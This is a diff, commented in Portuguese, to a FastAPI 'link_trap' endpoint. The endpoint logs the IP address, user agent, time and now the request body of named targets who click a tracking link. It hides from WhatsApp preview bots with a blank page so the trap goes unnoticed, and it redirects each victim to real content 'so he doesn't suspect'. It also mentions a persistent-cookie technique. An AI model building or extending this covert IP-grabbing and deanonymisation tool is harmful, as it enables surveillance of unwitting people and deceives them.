@@ -4,6 +4,7 @@ from loguru import logger
 from datetime import datetime
 
 router = APIRouter( tags=['telemetry'])
+telemetry_logger = logger.bind(module='telemetry')
 
 # Simulação de DB em memória (usa Redis ou SQL na vida real, Boss)
 TARGETS = {
@@ -16,7 +17,16 @@ async def link_trap(target_hash: str, request: Request):
     # 1. Captura o User-Agent
     user_agent = request.headers.get("user-agent", "").lower()
     client_ip = request.client.host
-    
+    # telemetry_logger.debug(request.headers.get())
+    telemetry_logger.debug(request.client)
+    # request.body é um método assíncrono — precisamos aguardar o corpo
+    body_bytes = await request.body()
+    if body_bytes:
+        try:
+            body_text = body_bytes.decode('utf-8')
+        except Exception:
+            body_text = repr(body_bytes)
+        telemetry_logger.debug(body_text)
     # Valida se o hash existe
     target_data = TARGETS.get(target_hash)
     if not target_data:
@@ -39,20 +49,18 @@ async def link_trap(target_hash: str, request: Request):
             <body></body>
         </html>
         """
-        logger.info(f"[BOT IGNORADO] Bot do WhatsApp tentou ler o link de {target_data['name']}")
-        logger.info(f"IP: {client_ip}")
-        logger.info(f"User-Agent: {user_agent}")
-        logger.info(f"Hora: {datetime.now()}\n")
+        telemetry_logger.debug(f"[BOT IGNORADO] Bot do WhatsApp tentou ler o link de {target_data['name']}")
+        telemetry_logger.debug(f"IP: {client_ip}")
+        telemetry_logger.debug(f"User-Agent: {user_agent}")
+        telemetry_logger.debug(f"Hora: {datetime.now()}\n")
         return HTMLResponse(content=html_content)
 
     else:
         # 4. MODO CAPTURA: É um browser real (Humano)
-        logger.info(f"\n[ALERTA VERMELHO] >>> {target_data['name']} CLICOU NO LINK! <<<")
-        logger.info(f"IP: {client_ip}")
-        logger.info(f"User-Agent: {user_agent}")
-        logger.info(f"Hora: {datetime.now()}\n")
-
-        # 5. O Redirecionamento + Cookie Persistente (A Técnica do Grupo)
+        telemetry_logger.debug(f"[ALERTA VERMELHO] >>> {target_data['name']} CLICOU NO LINK! <<<")
+        telemetry_logger.debug(f"IP: {client_ip}")
+        telemetry_logger.debug(f"User-Agent: {user_agent}")
+        telemetry_logger.debug(f"Hora: {datetime.now()}\n")
         # Redireciona o alvo para o conteúdo real para ele não desconfiar
         response = RedirectResponse(url=target_data["redirect"])
         
